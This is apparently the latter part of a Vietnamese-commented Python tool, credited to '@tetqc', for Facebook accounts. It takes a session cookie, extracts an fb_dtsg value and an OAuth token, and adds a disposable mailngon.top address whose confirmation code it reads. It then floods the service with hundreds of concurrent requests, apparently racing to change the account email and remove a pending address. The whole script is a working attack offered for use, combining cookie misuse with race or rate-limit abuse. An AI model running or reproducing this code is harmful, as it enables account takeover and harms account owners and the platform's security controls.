cmVzc01vZGlmaWNhdGlvbk9wdGlvblNldCIsIkNsYXNzT25seU5vdGlmT3B0aW9uU2V0SUQiLCIiXQ==\"],\"source\":\"notif_settings_page\",\"actor_id\":\""+uid+"\",\"client_mutation_id\":\"1\"},\"scale\":1}",
        'doc_id': "9633107586768738"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Authorization": f"OAuth {token}",
        "Cookie": cookies
    }

    # Gửi request 1
    async with session.post(url, data=payload_1, headers=headers) as resp1:
        kqua_1 = await resp1.text()

    if "SETTING_PAGE_SECTION" in kqua_1:
        # Request 1 thành công, gửi request 2
        async with session.post(url, data=payload_2, headers=headers) as resp2:
            kqua_2 = await resp2.text()

        if "SETTING_PAGE_SECTION" in kqua_2:
            # Thành công cả 2 request
            print(f"✅ Thành công")
            success = True
            return True
        elif "rate limit" in kqua_2.lower():
            print(f"⚠️ Rate limit - {kqua_2}")
            return False
        else:
            print("❌ Thất bại")
            return False
    else:
        print("❌ Thất bại")
        return False

success = False
# Hàm retry chung cho tất cả các bước
def retry_function(func, *args, retries=5, delay=1):
    for attempt in range(retries):
        result = func(*args)
        if result:  # Nếu kết quả hợp lệ, trả về kết quả
            return result
        print(f"Lỗi khi gọi {func.__name__}, thử lại lần {attempt + 1}")
        time.sleep(delay)
    return False  # Nếu không thành công sau 5 lần thử, trả về False
def get_retry_data(func, *args, max_retries=5):
    """Handles retry logic for function calls."""
    attempt = 0
    while attempt < max_retries:
        result = func(*args)
        if result:
            return result
        attempt += 1
        print(f"Attempt {attempt} failed. Retrying...")
        time.sleep(2)
    print(f"Failed after {max_retries} retries.")
    return None

async def loop_requests():
    print("SHARE BY @tetqc")
    mail_pending = input("Nhập Mail Cần Xóa: ").strip()
    mail_set = input("Nhập Mail Set (Không Nhập Tự ADD mailngon.top): ").strip()
    cookies = input("Nhập Cookie: ").strip()

    global success
    # Nhập số lượng luồng từ người dùng (mặc định là 500)
    try:
        LUONG = int(input("Nhập số lượng luồng (mặc định là 500): ").strip() or 200)
    except ValueError:
        print("Số lượng luồng không hợp lệ, mặc định là 500.")
        LUONG = 500

    lan = 1  # Số lần chạy

    # Lấy uid từ cookies
    get_uid = re.search(r'c_user=(\d+)', cookies)
    if get_uid:
        uid = get_uid.group(1)

        # Retry lấy fb_dtsg
        fb_dtsg = get_retry_data(retry_function, get_data_dtsg, cookies)
        if not fb_dtsg:
            print("Không thể lấy fb_dtsg từ cookie sau 5 lần thử.")
            return

        # Retry lấy token
        token = get_retry_data(retry_function, get_token, fb_dtsg, cookies, uid)
        if not token:
            print("Không thể lấy token từ cookie sau 5 lần thử.")
            return

        # Retry thực hiện step 1
        step_one = get_retry_data(retry_function, step_1, fb_dtsg, cookies, uid)
        if not step_one:
            print("Đã xảy ra lỗi với STEP 1 sau 5 lần thử.")
            return

        print("STEP 1 OK")

        # Retry gửi mail pending
        send_pending = get_retry_data(retry_function, step_2, mail_pending, fb_dtsg, cookies, uid)
        if not send_pending:
            print(f"MAIL {mail_pending} GỬI PENDING THẤT BẠI sau 5 lần thử.")
            return

        if not mail_set:
            # Tạo mail ngẫu nhiên và gửi mã code
            mail_random = f"{random_chuoi(18)}@mailngon.top"
            print(f"MAIL {mail_random}")

            # Retry gửi mail ngẫu nhiên
            send_code = get_retry_data(retry_function, step_2, mail_random, fb_dtsg, cookies, uid)
            if not send_code:
                print(f"MAIL {mail_random} GỬI CODE THẤT BẠI sau 5 lần thử.")
                return

            print(f"BẮT ĐẦU GET CODE MAIL")
            code = None

            # Try to get the code from the mail
            for attempt in range(10):
                code = get_code_mail(mail_random)
                if code:
                    print(f"CODE: {code} ĐÃ LẤY THÀNH CÔNG.")
                    break
                else:
                    print(f"Không lấy được mã lần {attempt + 1}, thử lại...")
                    time.sleep(2)

            if not code:
                # If still no code after 10 attempts, resend the code
                print(f"Không lấy được mã sau 10 lần thử. Gửi lại mã...")

                send_code = get_retry_data(retry_function, step_2, mail_random, fb_dtsg, cookies, uid)
                if not send_code:
                    print(f"MAIL {mail_random} GỬI CODE THẤT BẠI sau khi thử lại.")
                    return

                # Try to get the code again after resending (retry up to 10 times)
                print(f"BẮT ĐẦU GET CODE MAIL LẦN 2")
                for attempt in range(10):
                    code = get_code_mail(mail_random)
                    if code:
                        print(f"CODE: {code} ĐÃ LẤY THÀNH CÔNG SAU KHI GỬI LẠI.")
                        break
                    else:
                        print(f"Không lấy được mã lần {attempt + 1}, thử lại...")
                        time.sleep(2)

                if not code:
                    print(f"Không lấy được mã sau khi thử lại 10 lần.")
                    return

            # Confirm email and code
            if code:
                kqua_add = get_retry_data(comfirm_mail, mail_random, code, fb_dtsg, cookies, uid)
                if not kqua_add:
                    print(f"CONFIRM MAIL {mail_random} THẤT BẠI sau 5 lần thử.")
                    return
        else:
            mail_random = mail_set

        # Start the loop to send requests
        async with aiohttp.ClientSession() as session:
            while not success:
                print(f"Chạy gửi request cho {LUONG} lần {lan}")
                tasks = [asyncio.create_task(send(session, cookies, fb_dtsg, mail_pending, mail_random, uid, token)) for _ in range(LUONG)]
                await asyncio.gather(*tasks)

                print(f"✅ Hoàn tất gửi request lần {lan}")
                lan += 1

                if success:
                    for i in range(2):
                        xoa_pending(cookies,fb_dtsg,uid,mail_pending)
                    print("✅ Đã thành công, dừng lại!")
                    break

    else:
        print("cookie không hợp lệ")
# Chạy vòng lặp liên tục mà không cần gọi lại main()
asyncio.run(loop_requests())

                        













    




